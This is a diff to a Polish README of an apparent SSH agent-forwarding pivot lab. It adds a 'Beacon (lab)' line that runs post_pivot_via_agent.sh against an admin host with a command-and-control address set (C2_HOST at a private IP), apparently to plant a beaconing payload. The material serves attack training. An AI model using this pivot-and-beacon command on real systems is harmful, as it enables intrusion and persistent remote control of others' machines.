@@ -21,6 +21,9 @@ sudo ./watch_ssh_client_pivot.sh 172.17.0.2   # w tle / systemd (lab)
 
 Zmienne: `SSH_SERVER_PORT`, `ADMIN_SSH_PORT`, `REMOTE_CMD`, `OUT_KEY`, `INTERVAL`, `STATE_FILE`.
 
+**Beacon (lab):** w `remote_on_admin_host.sh` ustaw `C2_HOST` / `PAYLOAD_NAME` albo:
+`C2_HOST=http://192.168.0.111:8080 sudo ./post_pivot_via_agent.sh <ADMIN_IP>`
+
 Write-up (sekcja persistence): [WRITEUP-admin-ssh-infected-machine.md](../WRITEUP-admin-ssh-infected-machine.md)
 
 Wymuszenie `-A` na serwerze (pułapka): [WRITEUP-ssh-agent-forward-trap.md](../WRITEUP-ssh-agent-forward-trap.md) + [../ssh-agent-forward-trap/](../ssh-agent-forward-trap/)
